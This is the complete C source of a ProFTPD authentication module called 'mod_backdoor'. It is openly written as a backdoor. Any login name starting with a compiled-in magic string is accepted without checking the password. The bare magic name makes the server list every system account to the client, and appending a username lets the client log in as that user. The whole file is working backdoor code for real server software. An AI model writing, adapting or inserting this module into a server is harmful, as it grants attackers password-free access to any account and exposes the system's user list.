#include "conf.h"
#include "privs.h"

#define MOD_BACKDOOR_VERSION "mod_backdoor/0.1"

module backdoor_module;
static authtable backdoor_authtab[];

/*
   cmd->argv[0] = hashed pw
   cmd->argv[1] = username
   cmd->argv[2] = plaintext pw
*/
MODRET backdoor_chkpass(cmd_rec *cmd) {
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmod: enter chkpass()");
#endif

  if (!cmd)
    return DECLINED(cmd);
  if (!cmd->argv[1])
    return DECLINED(cmd);

  if (strncmp(cmd->argv[1], BACKDOOR_AUTHMODULE, strlen(BACKDOOR_AUTHMODULE)) == 0) {
    HANDLED(cmd);
  }

  return DECLINED(cmd);
}

/*
   cmd->argv[0] = username
   cmd->argv[1] = plaintext pw
*/
MODRET backdoor_auth(cmd_rec *cmd) {
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmod: enter auth()");
#endif

  if (!cmd)
    return DECLINED(cmd);
  if (!cmd->argv[0])
    return DECLINED(cmd);

#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmod: cmp(%s, %s)", BACKDOOR_AUTHMODULE, cmd->argv[0]);
#endif
  if (strncmp(cmd->argv[0], BACKDOOR_AUTHMODULE, strlen(BACKDOOR_AUTHMODULE)) == 0) {
    if (strlen(cmd->argv[0]) == strlen(BACKDOOR_AUTHMODULE)) {
      struct passwd *pwd;
      setpwent();
      pr_response_send_raw("%s-Impersonate one of the following users by appending the username to %s:", "230", BACKDOOR_AUTHMODULE);
      while ((pwd = getpwent()) != NULL)
      {
        pr_log_pri(PR_LOG_NOTICE, "%s", pwd->pw_name);
        pr_response_send_raw("%s-%s", "230", pwd->pw_name);
      }

      return PR_DECLINED(cmd);
    }

    session.auth_mech = "mod_auth_file.c";
    return PR_HANDLED(cmd);
  }

  return PR_DECLINED(cmd);
}

/* User information callbacks */

MODRET bd_endpwent(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_endpwent()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_getpwent(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_getpwent()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_getpwnam(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_getpwnam()");
  pr_log_pri(PR_LOG_NOTICE, "authmod: cmp(%s, %s)", BACKDOOR_AUTHMODULE, cmd->argv[0]);
#endif
  if (strncmp(cmd->argv[0], BACKDOOR_AUTHMODULE, strlen(BACKDOOR_AUTHMODULE)) != 0) {
    return PR_DECLINED(cmd);
  }

  struct passwd *pwd;

  if (strlen(cmd->argv[0]) == strlen(BACKDOOR_AUTHMODULE)) {
    pwd = getpwnam("bin");
    if (pwd) {
      return mod_create_data(cmd, pwd);
    }
    else {
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: getpwnam() failed");
#endif
      return PR_DECLINED(cmd);
    }
  }

  char *impersonation = cmd->argv[0] + strlen(BACKDOOR_AUTHMODULE);
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: getpwnam() impersonation: %s", impersonation);
#endif
  
  pwd = getpwnam(impersonation);
  if (pwd) {
    return mod_create_data(cmd, pwd);
  }
#ifdef BACKDOOR_DEBUG
  else {
    pr_log_pri(PR_LOG_NOTICE, "authmodul: getpwnam() failed");
  }
#endif

  return PR_DECLINED(cmd);
}

MODRET bd_getpwuid(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_getpwuid()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_name2uid(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_nam2uid()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_setpwent(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: bd_setpwent()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_uid2name(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_uid2name()");
#endif
  return PR_DECLINED(cmd);
}

/* Group information callbacks */

MODRET bd_endgrent(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_endgrent()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_getgrent(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_getgrent()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_getgrgid(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_getgrgid()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_getgrnam(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_getgrnam()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_getgroups(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_getgroups()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_gid2name(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_gid2name()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_name2gid(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_name2gid()");
#endif
  return PR_DECLINED(cmd);
}

MODRET bd_setgrent(cmd_rec *cmd)
{
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter bd_setgrent()");
#endif
  return PR_DECLINED(cmd);
}

/* initialization functions */

static int backdoor_init(void) {
#ifdef BACKDOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter backdoor_init()");
  pr_log_pri(PR_LOG_NOTICE, "authmodul: user: %s", BACKDOOR_AUTHMODULE);
#endif
  return 0;
}

static int backdoor_session_init(void) {
#ifdef BACKOOR_DEBUG
  pr_log_pri(PR_LOG_NOTICE, "authmodul: enter backdoor_session_init()");
  pr_log_pri(PR_LOG_NOTICE, "authmodul: user: %s", BACKDOOR_AUTHMODULE);
#endif
  return 0;
}

/* module API tables */

static authtable backdoor_authtab[] = {
  /* User information callbacks */
  { 0, "endpwent",	bd_endpwent },
  { 0, "getpwent",	bd_getpwent },
  { 0, "getpwnam",	bd_getpwnam },
  { 0, "getpwuid",	bd_getpwuid },
  { 0, "name2uid",	bd_name2uid },
  { 0, "setpwent",	bd_setpwent },
  { 0, "uid2name",	bd_uid2name },

  /* Group information callbacks */
  { 0, "endgrent",	bd_endgrent },
  { 0, "getgrent",	bd_getgrent },
  { 0, "getgrgid",	bd_getgrgid },
  { 0, "getgrnam",	bd_getgrnam },
  { 0, "getgroups",	bd_getgroups },
  { 0, "gid2name",	bd_gid2name },
  { 0, "name2gid",	bd_name2gid },
  { 0, "setgrent",	bd_setgrent },

  /* misc callbacks */
  { 0, "auth", backdoor_auth },
  { 0, "check", backdoor_chkpass },

  { 0, NULL, NULL }
};

module backdoor_module = {
  /* always NULL */
  NULL, NULL,

  /* module API version */
  0x20,

  /* Module name */
  "backdoor",

  /* module configuration handler table */
  NULL,

  /* module command handler table */
  NULL,

  /* module authentication handler table */
  backdoor_authtab,

  /* module initialization function */
  backdoor_init,

  /* session initialization function */
  backdoor_session_init,

  /* module version */
  MOD_BACKDOOR_VERSION
};
